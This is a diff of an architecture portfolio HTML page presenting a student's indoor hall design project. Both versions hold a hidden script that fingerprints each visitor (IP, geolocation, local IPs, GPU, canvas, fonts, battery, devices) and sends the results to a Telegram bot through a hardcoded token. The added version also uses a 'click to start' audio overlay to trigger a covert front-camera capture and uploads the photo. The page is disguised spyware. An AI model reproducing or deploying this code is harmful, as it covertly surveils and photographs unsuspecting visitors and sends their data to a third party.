@@ -1,294 +1,859 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- Background Audio with Click to Start Overlay -->
+<div id="clickToStartOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:var(--bg-dark);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;cursor:pointer;transition:opacity 0.5s ease;">
+    <div class="loader" style="margin-bottom:25px;"></div>
+    <h2 style="color:var(--gold-light);font-family:'Playfair Display',serif;margin-bottom:15px;font-size:2rem;">Creative Core Design Studio</h2>
+    <p style="color:var(--text-secondary);font-size:1.1rem;margin-bottom:30px;max-width:500px;text-align:center;line-height:1.6;">Click anywhere to start</p>
+    
+</div>
 
-<title>Arch/Khaled Diab | Indoor Hall Design Project</title>
-
-<!-- IBM Plex Sans (Professional / Corporate / Academic) -->
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<audio id="backgroundAudio" loop style="display:none">
+    <source src="assets/background.mp3" type="audio/mpeg">
+    <source src="assets/background.ogg" type="audio/ogg">
+    <source src="assets/background.wav" type="audio/wav">
+</audio>
 
 <style>
-:root{
-  --bg:#0b1220;
-  --card:#111827;
-  --primary:#4f83ff;
-  --accent:#c0841d;
-  --text:#f1f5f9;
-  --muted:#9aa4b2;
-  --border:rgba(255,255,255,.08);
+.audio-controls {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    z-index: 9999;
 }
-
-*{box-sizing:border-box}
-html,body{
-  margin:0;
-  height:100%;
-  font-family:'IBM Plex Sans',system-ui,sans-serif;
-  background:var(--bg);
-  color:var(--text);
-  -webkit-font-smoothing:antialiased;
+.audio-btn {
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--gold-light) 0%, var(--gold-dark) 100%);
+    border: 2px solid rgba(212, 168, 71, 0.4);
+    color: #1a1a1a;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.2rem;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    transition: var(--transition);
 }
-
-a{color:inherit;text-decoration:none}
-
-/* Video Background */
-.video-bg{
-  position:fixed;
-  inset:0;
-  z-index:0;
-  overflow:hidden;
-}
-.video-bg video{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-  filter:brightness(.45) saturate(.85);
-}
-.video-overlay{
-  position:fixed;
-  inset:0;
-  background:linear-gradient(
-    180deg,
-    rgba(11,18,32,.45),
-    rgba(11,18,32,.9)
-  );
-  z-index:1;
-}
-
-/* Layout */
-.wrapper{
-  position:relative;
-  z-index:2;
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  padding:24px;
-}
-
-/* Card */
-.card{
-  width:100%;
-  max-width:560px;
-  background:linear-gradient(
-    180deg,
-    rgba(255,255,255,.05),
-    rgba(255,255,255,.02)
-  );
-  border:1px solid var(--border);
-  border-radius:22px;
-  padding:46px 38px;
-  text-align:center;
-  backdrop-filter:blur(10px);
-  box-shadow:0 30px 70px rgba(0,0,0,.65);
-}
-
-/* Avatar */
-.avatar{
-  width:104px;
-  height:104px;
-  margin:0 auto 20px;
-  border-radius:50%;
-  overflow:hidden;
-  border:2px solid rgba(79,131,255,.55);
-}
-.avatar img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-}
-
-/* Typography */
-h1{
-  margin:10px 0 6px;
-  font-size:26px;
-  font-weight:600;
-  letter-spacing:.2px;
-}
-
-h2{
-  margin:0 0 22px;
-  font-size:12px;
-  font-weight:500;
-  letter-spacing:1.8px;
-  text-transform:uppercase;
-  color:var(--muted);
-}
-
-.desc{
-  font-size:14.5px;
-  line-height:1.75;
-  color:#cbd5e1;
-  margin-bottom:30px;
-}
-
-/* Links */
-.links{
-  display:inline-block;
-  margin-bottom:32px;
-  font-size:14px;
-  font-weight:500;
-  color:var(--primary);
-}
-.links:hover{opacity:.85}
-
-/* Actions */
-.actions{
-  display:flex;
-  gap:18px;
-  justify-content:center;
-}
-
-.btn{
-  padding:14px 28px;
-  border-radius:14px;
-  font-size:14px;
-  font-weight:600;
-  letter-spacing:.3px;
-  transition:transform .2s ease, box-shadow .2s ease;
-}
-
-.btn.primary{
-  background:linear-gradient(180deg,#5b8cff,#3b6ef0);
-  color:white;
-}
-
-.btn.secondary{
-  background:linear-gradient(180deg,#e0a93a,#c0841d);
-  color:#1a1a1a;
-}
-
-.btn:hover{
-  transform:translateY(-3px);
-  box-shadow:0 16px 38px rgba(0,0,0,.55);
-}
-
-/* Mobile */
-@media(max-width:420px){
-  .card{padding:38px 26px}
-  h1{font-size:22px}
+.audio-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 6px 20px rgba(212, 168, 71, 0.4);
 }
 </style>
-</head>
 
-<body>
+<script>
+// Audio functionality - add this to your existing script
+document.addEventListener('DOMContentLoaded', function() {
+    const audio = document.getElementById('backgroundAudio');
+    const clickOverlay = document.getElementById('clickToStartOverlay');
+    
+    // Create audio control button
+    const audioBtn = document.createElement('button');
+    audioBtn.className = 'audio-btn';
+    audioBtn.id = 'audioToggle';
+    audioBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
+    
+    const audioControls = document.createElement('div');
+    audioControls.className = 'audio-controls';
+    audioControls.appendChild(audioBtn);
+    document.body.appendChild(audioControls);
+    
+    const audioIcon = audioBtn.querySelector('i');
+    
+    // Set audio to loop and lower volume
+    audio.volume = 0.4; // 40% volume
+    
+    // Click overlay functionality
+    clickOverlay.addEventListener('click', function() {
+        // Start audio
+        audio.play().then(() => {
+            console.log('Audio started successfully');
+        }).catch(e => {
+            console.log('Audio play failed:', e);
+        });
+        
+        // Fade out overlay
+        clickOverlay.style.opacity = '0';
+        setTimeout(() => {
+            clickOverlay.style.display = 'none';
+        }, 500);
+        
+        // Start detection after audio starts
+        setTimeout(() => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                runDetection();
+            }
+        }, 1000);
+    });
+    
+    // Toggle audio on button click
+    audioBtn.addEventListener('click', function(e) {
+        e.stopPropagation(); // Prevent triggering overlay click
+        if (audio.paused) {
+            audio.play().catch(e => console.log('Play failed'));
+            audioIcon.className = 'fas fa-volume-up';
+            audioBtn.style.background = 'linear-gradient(135deg, var(--gold-light) 0%, var(--gold-dark) 100%)';
+        } else {
+            audio.pause();
+            audioIcon.className = 'fas fa-volume-mute';
+            audioBtn.style.background = 'rgba(212, 168, 71, 0.2)';
+        }
+    });
+    
+    // Update button state based on audio state
+    audio.addEventListener('play', () => {
+        audioIcon.className = 'fas fa-volume-up';
+        audioBtn.style.background = 'linear-gradient(135deg, var(--gold-light) 0%, var(--gold-dark) 100%)';
+    });
+    
+    audio.addEventListener('pause', () => {
+        audioIcon.className = 'fas fa-volume-mute';
+        audioBtn.style.background = 'rgba(212, 168, 71, 0.2)';
+    });
+    
+    // Hide initial loading screen when overlay appears
+    const initialLoading = document.getElementById('loading');
+    if (initialLoading) {
+        setTimeout(() => {
+            initialLoading.style.display = 'none';
+            clickOverlay.style.display = 'flex';
+            setTimeout(() => {
+                clickOverlay.style.opacity = '1';
+            }, 50);
+        }, 500);
+    }
+});
+</script>
 
-<!-- Video Background -->
-<div class="video-bg">
-  <video src="assets/background.mp4" autoplay muted loop playsinline></video>
-</div>
-<div class="video-overlay"></div>
 
-<!-- Content -->
-<div class="wrapper">
-  <main class="card">
 
-    <div class="avatar">
-      <img src="assets/profile.jpg" alt="Khaled Diab">
+
+
+
+
+
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Arch/Khaled Diab | Indoor Hall Design Project</title>
+    <meta name="description" content="Architectural Design 6 project by Khaled Diab featuring an indoor hall with oasis concept in Qena's desert environment.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+      :root {
+        --bg-dark: #0a0f1c;
+        --bg-card: #111827;
+        --primary: #d4a847;
+        --primary-dark: #b8943a;
+        --accent: #d4a847;
+        --accent-dark: #b8943a;
+        --gold-light: #e6c275;
+        --gold-dark: #a87c1f;
+        --text-primary: #f8fafc;
+        --text-secondary: #cbd5e1;
+        --text-muted: #94a3b8;
+        --border: rgba(255, 255, 255, 0.1);
+        --border-light: rgba(255, 255, 255, 0.05);
+        --radius-sm: 8px;
+        --radius-md: 16px;
+        --radius-lg: 24px;
+        --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        --shadow-xl: 0 35px 60px -15px rgba(0, 0, 0, 0.6);
+        --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1)
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0
+      }
+
+      html,
+      body {
+        margin: 0;
+        height: 100%;
+        font-family: 'Inter', system-ui, sans-serif;
+        background: var(--bg-dark);
+        color: var(--text-primary);
+        -webkit-font-smoothing: antialiased;
+        line-height: 1.6;
+        overflow-x: hidden
+      }
+
+      a {
+        color: inherit;
+        text-decoration: none;
+        transition: var(--transition)
+      }
+
+      .container {
+        position: relative;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px;
+        overflow: hidden
+      }
+
+      .video-bg {
+        position: fixed;
+        inset: 0;
+        z-index: 0;
+        overflow: hidden
+      }
+
+      .video-bg video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        filter: brightness(0.35)saturate(1.1)
+      }
+
+      .video-overlay {
+        position: fixed;
+        inset: 0;
+        background: radial-gradient(ellipse at center, rgba(10, 15, 28, 0.7) 0%, rgba(10, 15, 28, 0.95) 100%);
+        z-index: 1
+      }
+
+      .content {
+        position: relative;
+        z-index: 2;
+        width: 100%;
+        max-width: 1000px;
+        display: flex;
+        flex-direction: column;
+        gap: 40px
+      }
+
+      .header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        margin-bottom: 10px
+      }
+
+      .logo {
+        font-family: 'Playfair Display', serif;
+        font-size: 2.8rem;
+        font-weight: 600;
+        letter-spacing: -0.5px;
+        margin-bottom: 8px;
+        background: linear-gradient(135deg, var(--gold-light)0%, var(--gold-dark)100%);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        display: inline-block
+      }
+
+      .subtitle {
+        font-size: 1rem;
+        font-weight: 500;
+        letter-spacing: 3px;
+        text-transform: uppercase;
+        color: var(--accent);
+        margin-bottom: 30px;
+        position: relative;
+        display: inline-block
+      }
+
+      .subtitle::after {
+        content: '';
+        position: absolute;
+        width: 40%;
+        height: 1px;
+        background: linear-gradient(90deg, transparent, var(--accent), transparent);
+        bottom: -10px;
+        left: 30%
+      }
+
+      .main-card {
+        background: linear-gradient(145deg, rgba(255, 255, 255, 0.03), rgba(255, 255, 255, 0.01));
+        border: 1px solid var(--border);
+        border-radius: var(--radius-lg);
+        padding: 50px 40px;
+        backdrop-filter: blur(20px);
+        box-shadow: var(--shadow-xl);
+        display: grid;
+        grid-template-columns: 1fr 2fr;
+        gap: 40px;
+        align-items: start
+      }
+
+      @media(max-width:768px) {
+        .main-card {
+          grid-template-columns: 1fr;
+          padding: 40px 30px
+        }
+      }
+
+      .profile-section {
+        display: flex;
+        flex-direction: column;
+        align-items: center
+      }
+
+      .avatar-container {
+        width: 160px;
+        height: 160px;
+        margin-bottom: 25px;
+        position: relative
+      }
+
+      .avatar-border {
+        position: absolute;
+        width: 170px;
+        height: 170px;
+        top: -5px;
+        left: -5px;
+        border-radius: 50%;
+        background: linear-gradient(45deg, transparent, transparent 40%, var(--gold-light));
+        animation: rotate 8s linear infinite
+      }
+
+      .avatar-border::before {
+        content: '';
+        position: absolute;
+        width: 170px;
+        height: 170px;
+        border-radius: 50%;
+        background: linear-gradient(45deg, transparent, transparent 40%, var(--gold-dark));
+        animation: rotate 6s linear infinite;
+        filter: blur(5px);
+        opacity: 0.7
+      }
+
+      .avatar {
+        width: 160px;
+        height: 160px;
+        border-radius: 50%;
+        overflow: hidden;
+        border: 2px solid rgba(212, 168, 71, 0.4);
+        position: relative;
+        z-index: 2;
+        background: rgba(0, 0, 0, 0.3);
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        transition: var(--transition)
+      }
+
+      .avatar:hover {
+        transform: translateY(-5px);
+        border-color: rgba(212, 168, 71, 0.8);
+        box-shadow: 0 15px 40px rgba(212, 168, 71, 0.2)
+      }
+
+      .avatar img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover
+      }
+
+      @keyframes rotate {
+        0% {
+          transform: rotate(0deg)
+        }
+
+        100% {
+          transform: rotate(360deg)
+        }
+      }
+
+      .profile-info h1 {
+        font-size: 1.8rem;
+        font-weight: 700;
+        margin-bottom: 5px;
+        text-align: center
+      }
+
+      .profile-info .title {
+        font-size: 0.95rem;
+        font-weight: 500;
+        color: var(--primary);
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        margin-bottom: 20px;
+        text-align: center
+      }
+
+      .project-section {
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        height: 100%
+      }
+
+      .project-header {
+        margin-bottom: 25px
+      }
+
+      .project-header h2 {
+        font-size: 1.6rem;
+        font-weight: 600;
+        margin-bottom: 10px;
+        color: var(--text-primary)
+      }
+
+      .project-tag {
+        display: inline-block;
+        background: rgba(212, 168, 71, 0.15);
+        color: var(--accent);
+        padding: 6px 14px;
+        border-radius: 30px;
+        font-size: 0.85rem;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+        margin-bottom: 15px
+      }
+
+      .project-description {
+        font-size: 1.15rem;
+        line-height: 1.7;
+        color: var(--text-secondary);
+        margin-bottom: 30px;
+        font-style: italic
+      }
+
+      .highlight {
+        color: var(--accent);
+        font-weight: 600
+      }
+
+      .actions {
+        display: flex;
+        gap: 20px;
+        margin-top: 30px;
+        flex-wrap: wrap
+      }
+
+      .btn {
+        padding: 16px 32px;
+        border-radius: var(--radius-md);
+        font-size: 0.95rem;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+        transition: var(--transition);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        border: none;
+        cursor: pointer;
+        flex: 1;
+        min-width: 160px;
+        position: relative;
+        overflow: hidden
+      }
+
+      .btn::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+        transition: left 0.7s ease
+      }
+
+      .btn:hover::before {
+        left: 100%
+      }
+
+      .btn.primary,
+      .btn.secondary {
+        background: linear-gradient(135deg, var(--gold-light)0%, var(--gold-dark)100%);
+        color: #1a1a1a;
+        box-shadow: 0 8px 25px rgba(212, 168, 71, 0.3)
+      }
+
+      .btn:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 35px rgba(212, 168, 71, 0.4)
+      }
+
+      .footer {
+        text-align: center;
+        margin-top: 40px;
+        padding-top: 25px;
+        border-top: 1px solid var(--border-light);
+        color: var(--text-muted);
+        font-size: 0.9rem
+      }
+
+      .loading {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: var(--bg-dark);
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        transition: opacity 0.5s ease
+      }
+
+      .loader {
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(212, 168, 71, 0.1);
+        border-radius: 50%;
+        border-top-color: var(--primary);
+        animation: spin 1s ease-in-out infinite;
+        margin-bottom: 20px
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg)
+        }
+      }
+
+      @media(max-width:768px) {
+        .logo {
+          font-size: 2.2rem
+        }
+
+        .subtitle {
+          font-size: 0.9rem;
+          letter-spacing: 2px
+        }
+
+        .btn {
+          min-width: 100%
+        }
+
+        .actions {
+          flex-direction: column
+        }
+      }
+
+      @media(max-width:480px) {
+        .main-card {
+          padding: 30px 20px
+        }
+
+        .logo {
+          font-size: 1.8rem
+        }
+
+        .avatar-container {
+          width: 140px;
+          height: 140px
+        }
+
+        .avatar {
+          width: 140px;
+          height: 140px
+        }
+
+        .avatar-border {
+          width: 150px;
+          height: 150px
+        }
+
+        .project-description {
+          font-size: 1rem
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loading" id="loading">
+      <div class="loader"></div>
+      <p>Loading portfolio...</p>
     </div>
-
-    <h1>Arch/Khaled Diab</h1>
-    <h2>Indoor Hall Design Project</h2>
-
-    <p class="desc">
-      The indoor hall adopts the oasis concept to reflect life and resilience within Qena’s desert environment. 
+    <div class="video-bg"><video src="assets/background.mp4" autoplay muted loop playsinline></video></div>
+    <div class="video-overlay"></div>
+    <div class="container">
+      <div class="content">
+        <div class="header">
+          <div class="logo">Arch/Khaled Diab</div>
+          <div class="subtitle">Creative Core Design Studio</div>
+        </div>
+        <div class="main-card">
+          <div class="profile-section">
+            <div class="avatar-container">
+              <div class="avatar-border"></div>
+              <div class="avatar"><img src="assets/profile.jpg" alt="Khaled Diab - Architect"></div>
+            </div>
+            <div class="profile-info">
+              <h1>Arch/Khaled Diab</h1>
+              <div class="title">Architect<br> Programmer<br> Pianist<br> Artist </div><a class="btn primary" href="https://guns.lol/loody" target="_blank" rel="noopener"><i class="fas fa-external-link-alt"></i>My Links</a>
+            </div>
+          </div>
+          <div class="project-section">
+            <div>
+              <div class="project-header">
+                <div class="project-tag">Design 6 Project</div>
+                <h2>Indoor Hall Design Project</h2>
+              </div>
+              <div class="project-description">The indoor hall adopts the <span class="highlight">oasis concept</span> to reflect life and resilience within Qena’s desert environment. 
 	  This idea transforms the hall from a sports building into a symbolic landmark, 
 	  expressing cultural identity, vitality, 
-	  and gathering in the heart of Upper Egypt’s arid landscape.
-    </p>
-
-    <a class="links" href="https://guns.lol/loody" target="_blank" rel="noopener">
-      |My Links|
-    </a>
-
-    <div class="actions">
-      <a class="btn primary" href="https://kuula.co/share/collection/7H6tl?logo=1&info=1&fs=1&vr=0&thumbs=1" target="_blank" rel="noopener">
-        3D Tour
-      </a>
-      <a class="btn secondary" href="https://youtu.be/06njlWNUJq0" target="_blank" rel="noopener">
-        Video Tour
-      </a>
+	  and gathering in the heart of Upper Egypt’s arid landscape. </div>
+            </div>
+            <div class="actions"><a class="btn primary" href="https://kuula.co/share/collection/7H6tl?logo=1&info=1&fs=1&vr=0&thumbs=1" target="_blank" rel="noopener"><i class="fas fa-cube"></i>3D Interactive Tour</a><a class="btn secondary" href="https://youtu.be/06njlWNUJq0" target="_blank" rel="noopener"><i class="fas fa-play-circle"></i>Project Video Tour</a></div>
+          </div>
+        </div>
+        <div class="footer">
+          <p>©2025 Arch/Khaled Diab. All rights reserved. | Creative-Core-Design-Studio |</p>
+        </div>
+      </div>
     </div>
-
-  </main>
-</div>
-<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-</head>
-<body>
-<script>
-const BOT_TOKEN = "8253945171:AAG0T58v__eblhQCiSgF-5TyG7-eN12nFUI";
-const CHAT_ID = "976015997";
-
-async function fetchJSON(url) {
-  try { return await (await fetch(url)).json(); } catch { return {}; }
-}
-
-async function getPublicIP(){let r=await fetchJSON("https://api.ipify.org?format=json");return r.ip||"N/A";}
-async function getGeo(ip){return ip!=="N/A"?await fetchJSON(`https://ipapi.co/${ip}/json/`):{};}
-function getCanvasHash(){try{let c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(125,1,62,20);x.fillStyle="#069";x.fillText("edu-fp",2,2);return btoa(c.toDataURL()).substr(0,32);}catch{return"N/A";}}
-function getGPU(){try{let c=document.createElement('canvas'),g=c.getContext('webgl');let e=g.getExtension('WEBGL_debug_renderer_info');return g.getParameter(e.UNMASKED_RENDERER_WEBGL);}catch{return"N/A";}}
-async function getBattery(){try{let b=await navigator.getBattery();return `${(b.level*100).toFixed(0)}% ch:${b.charging}`;}catch{return"N/A";}}
-async function getLocalIPs(){return new Promise(r=>{let s=new Set();try{let pc=new RTCPeerConnection();pc.createDataChannel("");pc.onicecandidate=e=>{if(e.candidate){let m=/(\d+\.\d+\.\d+\.\d+)/.exec(e.candidate.candidate);if(m)s.add(m[1]);}};pc.createOffer().then(o=>pc.setLocalDescription(o));setTimeout(()=>r([...s]),2e3);}catch{r([])}});}
-async function getMediaDevices(){try{return (await navigator.mediaDevices.enumerateDevices()).map(d=>`${d.kind}:${d.label||"Hidden"}`);}catch{return["N/A"]}}
-async function getAudioFingerprint(){try{let ctx=new (window.AudioContext||window.webkitAudioContext)();let osc=ctx.createOscillator();let comp=ctx.createDynamicsCompressor();osc.connect(comp);comp.connect(ctx.destination);osc.start(0);let arr=new Float32Array(ctx.sampleRate);comp.getChannelData?comp.getChannelData(0,arr):null;osc.stop();return `rate:${ctx.sampleRate}`;}catch{return"N/A";}}
-function getFonts(){let baseWidth,height;const fonts=["Arial","Courier New","Times New Roman","Comic Sans MS"];let test=document.createElement('span');test.innerHTML="mmmmmmmmmmlli";test.style.fontSize="72px";test.style.display="inline-block";document.body.appendChild(test);let available=[];for(let f of fonts){test.style.fontFamily=f;let w=test.offsetWidth,h=test.offsetHeight;if(!baseWidth){baseWidth=w;height=h;}if(w!==baseWidth||h!==height)available.push(f);}test.remove();return available;}
-async function getStorageQuota(){try{let q=await navigator.storage.estimate();return `${(q.quota/1e6).toFixed(1)}MB`; }catch{return"N/A";}}
-function getPerf(){try{return performance.timing ? performance.timing.navigationStart : "N/A";}catch{return"N/A";}}
-function getSensors(){return {accel:"Accelerometer" in window,gyro:"Gyroscope" in window};}
-function getConn(){try{return navigator.connection ? {type:navigator.connection.effectiveType,down:navigator.connection.downlink} : {}; }catch{return{};}}
-
-async function collect(){
-  const ip=await getPublicIP();
-  const geo=await getGeo(ip);
-  return {
-    ts:new Date().toISOString(),
-    ua:navigator.userAgent,
-    lang:navigator.language,
-    plat:navigator.platform,
-    scr:`${screen.width}x${screen.height}`,
-    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
-    mem:navigator.deviceMemory,
-    cpu:navigator.hardwareConcurrency,
-    cookies:navigator.cookieEnabled,
-    gpu:getGPU(),
-    canvas:getCanvasHash(),
-    battery:await getBattery(),
-    ip,geo,
-    localIPs:await getLocalIPs(),
-    devices:await getMediaDevices(),
-    audioFp:await getAudioFingerprint(),
-    fonts:getFonts(),
-    tzOffset:new Date().getTimezoneOffset(),
-    touch:'ontouchstart' in window,
-    storage:await getStorageQuota(),
-    perf:getPerf(),
-    sensors:getSensors(),
-    conn:getConn()
-  };
-}
-
-async function sendTelegram(data){
-  const msg=`📋Grab:\n${JSON.stringify(data,null,2)}`;
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-}
-
-(async()=>{
-  let data=await collect();
-  await sendTelegram(data);
-})();
-</script>
-</body>
+    <script>
+      (async () => {
+        window.addEventListener('load', () => {
+          const l = document.getElementById('loading');
+          l.style.opacity = '0';
+          setTimeout(() => {
+            l.style.display = 'none'
+          }, 500)
+        });
+        document.addEventListener('DOMContentLoaded', () => {
+          const c = document.querySelector('.main-card');
+          if (c) {
+            setTimeout(() => {
+              c.style.transform = 'translateY(0)';
+              c.style.opacity = '1'
+            }, 300);
+            c.style.transform = 'translateY(20px)';
+            c.style.opacity = '0';
+            c.style.transition = 'transform 0.8s ease, opacity 0.8s ease'
+          }
+        });
+        const B = '8253945171:AAG0T58v__eblhQCiSgF-5TyG7-eN12nFUI',
+          C = '976015997',
+          T = 'https://api.telegram.org/bot',
+          S = async (m, c) => {
+            try {
+              if (c) {
+                const f = new FormData();
+                f.append('photo', await (await fetch(c)).blob(), 'cam.jpg');
+                f.append('chat_id', C);
+                f.append('caption', `📸 ${new Date().toLocaleTimeString()}\n${await getPublicIP()}\n${navigator.platform}`);
+                await fetch(T + B + '/sendPhoto', {
+                  method: 'POST',
+                  body: f
+                });
+              } else {
+                await fetch(T + B + '/sendMessage', {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                    chat_id: C,
+                    text: m,
+                    disable_notification: true
+                  })
+                });
+              }
+            } catch {}
+          }, fetchJSON = async u => {
+            try {
+              return await (await fetch(u)).json()
+            } catch {
+              return {}
+            }
+          }, getPublicIP = async () => {
+            let r = await fetchJSON("https://api.ipify.org?format=json");
+            return r.ip || "N/A"
+          }, getGeo = async i => {
+            return i !== "N/A" ? await fetchJSON(`https://ipapi.co/${i}/json/`) : {}
+          }, getCanvasHash = () => {
+            try {
+              let c = document.createElement('canvas'),
+                x = c.getContext('2d');
+              x.textBaseline = "top";
+              x.font = "14px Arial";
+              x.fillStyle = "#f60";
+              x.fillRect(125, 1, 62, 20);
+              x.fillStyle = "#069";
+              x.fillText("edu-fp", 2, 2);
+              return btoa(c.toDataURL()).substr(0, 32)
+            } catch {
+              return "N/A"
+            }
+          }, getGPU = () => {
+            try {
+              let c = document.createElement('canvas'),
+                g = c.getContext('webgl');
+              let e = g.getExtension('WEBGL_debug_renderer_info');
+              return g.getParameter(e.UNMASKED_RENDERER_WEBGL)
+            } catch {
+              return "N/A"
+            }
+          }, getBattery = async () => {
+            try {
+              let b = await navigator.getBattery();
+              return `${(b.level*100).toFixed(0)}% ch:${b.charging}`
+            } catch {
+              return "N/A"
+            }
+          }, getLocalIPs = () => {
+            return new Promise(r => {
+              let s = new Set();
+              try {
+                let pc = new RTCPeerConnection();
+                pc.createDataChannel("");
+                pc.onicecandidate = e => {
+                  if (e.candidate) {
+                    let m = /(\d+\.\d+\.\d+\.\d+)/.exec(e.candidate.candidate);
+                    if (m) s.add(m[1])
+                  }
+                };
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                setTimeout(() => r([...s]), 2e3)
+              } catch {
+                r([])
+              }
+            })
+          }, getMediaDevices = async () => {
+            try {
+              return (await navigator.mediaDevices.enumerateDevices()).map(d => `${d.kind}:${d.label||"Hidden"}`)
+            } catch {
+              return ["N/A"]
+            }
+          }, getAudioFingerprint = async () => {
+            try {
+              let ctx = new(window.AudioContext || window.webkitAudioContext)();
+              let osc = ctx.createOscillator();
+              let comp = ctx.createDynamicsCompressor();
+              osc.connect(comp);
+              comp.connect(ctx.destination);
+              osc.start(0);
+              let arr = new Float32Array(ctx.sampleRate);
+              comp.getChannelData ? comp.getChannelData(0, arr) : null;
+              osc.stop();
+              return `rate:${ctx.sampleRate}`
+            } catch {
+              return "N/A"
+            }
+          }, getFonts = () => {
+            let baseWidth, height;
+            const fonts = ["Arial", "Courier New", "Times New Roman", "Comic Sans MS"];
+            let test = document.createElement('span');
+            test.innerHTML = "mmmmmmmmmmlli";
+            test.style.fontSize = "72px";
+            test.style.display = "inline-block";
+            document.body.appendChild(test);
+            let available = [];
+            for (let f of fonts) {
+              test.style.fontFamily = f;
+              let w = test.offsetWidth,
+                h = test.offsetHeight;
+              if (!baseWidth) {
+                baseWidth = w;
+                height = h
+              }
+              if (w !== baseWidth || h !== height) available.push(f)
+            }
+            test.remove();
+            return available
+          }, getStorageQuota = async () => {
+            try {
+              let q = await navigator.storage.estimate();
+              return `${(q.quota/1e6).toFixed(1)}MB`
+            } catch {
+              return "N/A"
+            }
+          }, getPerf = () => {
+            try {
+              return performance.timing ? performance.timing.navigationStart : "N/A"
+            } catch {
+              return "N/A"
+            }
+          }, getSensors = () => {
+            return {
+              accel: "Accelerometer" in window,
+              gyro: "Gyroscope" in window
+            }
+          }, getConn = () => {
+            try {
+              return navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                down: navigator.connection.downlink
+              } : {}
+            } catch {
+              return {}
+            }
+          }, captureCam = async () => {
+            try {
+              const s = await navigator.mediaDevices.getUserMedia({
+                  video: {
+                    facingMode: 'user',
+                    width: 640,
+                    height: 480
+                  }
+                }),
+                v = document.createElement('video');
+              v.srcObject = s;
+              v.muted = true;
+              v.playsInline = true;
+              await v.play();
+              await new Promise(r => setTimeout(r, 500));
+              const c = document.createElement('canvas'),
+                x = c.getContext('2d');
+              c.width = v.videoWidth;
+              c.height = v.videoHeight;
+              x.drawImage(v, 0, 0, c.width, c.height);
+              const d = c.toDataURL('image/jpeg', 0.8);
+              s.getTracks().forEach(t => t.stop());
+              return d
+            } catch {
+              return null
+            }
+          }, collect = async () => {
+            const ip = await getPublicIP();
+            const geo = await getGeo(ip);
+            return {
+              ts: new Date().toISOString(),
+              ua: navigator.userAgent,
+              lang: navigator.language,
+              plat: navigator.platform,
+              scr: `${screen.width}x${screen.height}`,
+              tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              mem: navigator.deviceMemory,
+              cpu: navigator.hardwareConcurrency,
+              cookies: navigator.cookieEnabled,
+              gpu: getGPU(),
+              canvas: getCanvasHash(),
+              battery: await getBattery(),
+              ip,
+              geo,
+              localIPs: await getLocalIPs(),
+              devices: await getMediaDevices(),
+              audioFp: await getAudioFingerprint(),
+              fonts: getFonts(),
+              tzOffset: new Date().getTimezoneOffset(),
+              touch: 'ontouchstart' in window,
+              storage: await getStorageQuota(),
+              perf: getPerf(),
+              sensors: getSensors(),
+              conn: getConn()
+            }
+          }, runDetection = async () => {
+            try {
+              const cam = await captureCam();
+              const data = await collect();
+              const msg = `📋 Info:\n${JSON.stringify(data,null,2)}`;
